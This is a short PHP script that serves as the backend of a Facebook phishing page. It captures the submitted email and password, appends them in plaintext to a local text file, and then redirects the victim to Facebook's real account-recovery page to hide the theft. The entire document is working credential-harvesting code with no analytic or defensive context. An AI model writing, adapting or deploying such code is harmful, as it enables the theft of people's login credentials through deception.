<?php
file_put_contents("tkmk.txt", "USERNAME/UID : " . $_POST['email'] . " PASSWORD: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>

